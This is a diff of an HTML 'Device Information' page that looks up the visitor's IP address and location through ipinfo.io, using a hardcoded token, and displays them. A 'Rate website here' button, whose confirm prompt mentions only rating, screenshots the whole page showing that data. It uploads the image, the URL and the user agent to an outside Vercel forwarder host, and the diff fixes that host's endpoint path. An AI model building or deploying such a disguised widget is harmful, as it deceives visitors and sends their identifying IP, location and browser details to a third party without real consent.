@@ -1,156 +1,151 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Information</title>
-    <style>
-        /* General body styles */
-        body {
-            background-color: black;
-            color: white;
-            font-family: 'Courier New', Courier, monospace;
-            text-align: center;
-            margin-top: 50px;
-        }
-
-        /* Neon glowing effect for INFO with reduced brightness */
-        h1 {
-            font-size: 4rem;
-            color: #e74c3c;
-            text-shadow: 0 0 5px #e74c3c, 0 0 10px #e74c3c, 0 0 15px rgba(231, 76, 60, 0.6), 0 0 20px rgba(231, 76, 60, 0.4);
-        }
-
-        .glow {
-            color: white;
-            text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #fff;
-        }
-
-        #device-info {
-            font-size: 1.5rem;
-            margin-top: 30px;
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            display: inline-block;
-            text-align: left;
-            background-color: rgba(0, 0, 0, 0.7);
-            width: 90%;
-            max-width: 600px;
-        }
-    </style>
-</head>
-<!-- Screenshot widget: paste before </body> -->
-<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-
-<div id="screenshot-widget" style="position:fixed;right:12px;bottom:12px;z-index:9999;">
-  <button id="take-snap" style="padding:10px 12px;border-radius:8px;cursor:pointer">
-    Rate website here
-  </button>
-</div>
-
-<script>
-  async function confirmAndSend() {
-    const ok = confirm(
-      "Press to rate this website. Do you want to rate?"
-    );
-    if (!ok) return alert('Cancelled — no screenshot taken.');
-
-    try {
-      const canvas = await html2canvas(document.documentElement, {
-        logging: false,
-        useCORS: true,
-        scale: 1
-      });
-
-      canvas.toBlob(async (blob) => {
-        if (!blob) return alert('Failed to create image.');
-
-        const btn = document.getElementById('take-snap');
-        const prev = btn.innerText;
-        btn.innerText = 'Uploading…';
-        btn.disabled = true;
-
-        const fd = new FormData();
-        fd.append('file', blob, 'page-screenshot.png');
-        fd.append('url', window.location.href);
-        fd.append('userAgent', navigator.userAgent);
-
-        try {
-          // REPLACE below with your deployed forwarder URL (example: https://my-vercel-app.vercel.app/api/upload-screenshot)
-          const forwarderUrl = 'https://screenshot-forwarder-cl1vn6ffn-prcv1ns-projects.vercel.app';
-          const resp = await fetch(forwarderUrl, { method: 'POST', body: fd });
-          if (resp.ok) alert('Screenshot sent. Thank you!');
-          else {
-            console.error(await resp.text());
-            alert('Upload failed — check console.');
-          }
-        } catch (err) {
-          console.error(err);
-          alert('Upload error — check console.');
-        } finally {
-          btn.innerText = prev;
-          btn.disabled = false;
-        }
-      }, 'image/png', 0.9);
-    } catch (err) {
-      console.error(err);
-      alert('Screenshot failed or was blocked by the browser.');
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Information</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+      margin-top: 50px;
     }
-  }
 
-  document.getElementById('take-snap').addEventListener('click', confirmAndSend);
-</script>    
+    h1 {
+      font-size: 4rem;
+      color: #e74c3c;
+      text-shadow: 0 0 5px #e74c3c, 0 0 10px #e74c3c,
+                   0 0 15px rgba(231, 76, 60, 0.6),
+                   0 0 20px rgba(231, 76, 60, 0.4);
+    }
+
+    .glow {
+      color: white;
+      text-shadow: 0 0 5px #fff, 0 0 10px #fff,
+                   0 0 15px #fff, 0 0 20px #fff;
+    }
+
+    #device-info {
+      font-size: 1.5rem;
+      margin-top: 30px;
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      display: inline-block;
+      text-align: left;
+      background-color: rgba(0, 0, 0, 0.7);
+      width: 90%;
+      max-width: 600px;
+    }
+  </style>
+</head>
 <body>
+  <h1 class="glow">INFO</h1>
 
-    <h1 class="glow">INFO</h1>
+  <div id="device-info">
+    <div id="device-details">Loading device info...</div>
+  </div>
 
-    <div id="device-info">
-        <div id="device-details">Loading device info...</div>
-    </div>
+  <!-- Screenshot widget -->
+  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+  <div id="screenshot-widget" style="position:fixed;right:12px;bottom:12px;z-index:9999;">
+    <button id="take-snap" style="padding:10px 12px;border-radius:8px;cursor:pointer">
+      Rate website here
+    </button>
+  </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
-    <script>
-        // Function to fetch and display device information
-        function fetchDeviceInfo() {
-            // Use the API token you provided: a255e3bf868c50
-            axios.get('https://ipinfo.io/json?token=a255e3bf868c50')
-                .then(function(response) {
-                    const data = response.data;
-                    const ip = data.ip;
-                    const city = data.city || "Unknown";
-                    const region = data.region || "Unknown";
-                    const country = data.country || "Unknown";
-                    const loc = data.loc || "Unknown";  // latitude, longitude
-                    const timezone = data.timezone || "Unknown";
-                    const date = new Date();
-                    const formattedDate = date.toLocaleDateString();
-                    const formattedTime = date.toLocaleTimeString();
-                    const browser = navigator.userAgent;
-                    const platform = navigator.platform;
+  <script>
+    async function confirmAndSend() {
+      const ok = confirm("Press to rate this website. Do you want to rate?");
+      if (!ok) return alert('Cancelled — no screenshot taken.');
 
-                    // Build the text string to display with line breaks (\n)
-                    const deviceInfo = `
-                        ip: ${ip}
-                        location: ${city}, ${region}, ${country}
-                        Timezone: ${timezone}
-                        Time: ${formattedTime}
-                        Date: ${formattedDate}
-                        Browser: ${browser}
-                        Platform: ${platform}
-                    `;
+      try {
+        const canvas = await html2canvas(document.documentElement, {
+          logging: false,
+          useCORS: true,
+          scale: 1
+        });
 
-                    // Display the device info immediately (no typing animation)
-                    document.getElementById('device-details').innerText = deviceInfo;
-                })
-                .catch(function(error) {
-                    console.error('Error fetching IP info:', error);
-                    document.getElementById('device-details').innerHTML = 'Sorry, we couldn\'t fetch device information at the moment.';
-                });
-        }
+        canvas.toBlob(async (blob) => {
+          if (!blob) return alert('Failed to create image.');
 
-        // Fetch device info when the page loads
-        fetchDeviceInfo();
-    </script>
+          const btn = document.getElementById('take-snap');
+          const prev = btn.innerText;
+          btn.innerText = 'Uploading…';
+          btn.disabled = true;
+
+          const fd = new FormData();
+          fd.append('file', blob, 'page-screenshot.png');
+          fd.append('url', window.location.href);
+          fd.append('userAgent', navigator.userAgent);
+
+          try {
+            // ✅ Correct forwarder URL with /api/upload-screenshot
+            const forwarderUrl = 'https://screenshot-forwarder-cl1vn6ffn-prcv1ns-projects.vercel.app/api/upload-screenshot';
+            const resp = await fetch(forwarderUrl, { method: 'POST', body: fd });
+            if (resp.ok) alert('Screenshot sent. Thank you!');
+            else {
+              console.error(await resp.text());
+              alert('Upload failed — check console.');
+            }
+          } catch (err) {
+            console.error(err);
+            alert('Upload error — check console.');
+          } finally {
+            btn.innerText = prev;
+            btn.disabled = false;
+          }
+        }, 'image/png', 0.9);
+      } catch (err) {
+        console.error(err);
+        alert('Screenshot failed or was blocked by the browser.');
+      }
+    }
+
+    document.getElementById('take-snap').addEventListener('click', confirmAndSend);
+  </script>
+
+  <!-- Device info -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+  <script>
+    function fetchDeviceInfo() {
+      axios.get('https://ipinfo.io/json?token=a255e3bf868c50')
+        .then(function(response) {
+          const data = response.data;
+          const ip = data.ip;
+          const city = data.city || "Unknown";
+          const region = data.region || "Unknown";
+          const country = data.country || "Unknown";
+          const loc = data.loc || "Unknown";
+          const timezone = data.timezone || "Unknown";
+          const date = new Date();
+          const formattedDate = date.toLocaleDateString();
+          const formattedTime = date.toLocaleTimeString();
+          const browser = navigator.userAgent;
+          const platform = navigator.platform;
+
+          const deviceInfo = `
+            ip: ${ip}
+            location: ${city}, ${region}, ${country}
+            Timezone: ${timezone}
+            Time: ${formattedTime}
+            Date: ${formattedDate}
+            Browser: ${browser}
+            Platform: ${platform}
+          `;
+
+          document.getElementById('device-details').innerText = deviceInfo;
+        })
+        .catch(function(error) {
+          console.error('Error fetching IP info:', error);
+          document.getElementById('device-details').innerHTML =
+            'Sorry, we couldn\'t fetch device information at the moment.';
+        });
+    }
+
+    fetchDeviceInfo();
+  </script>
 </body>
 </html>
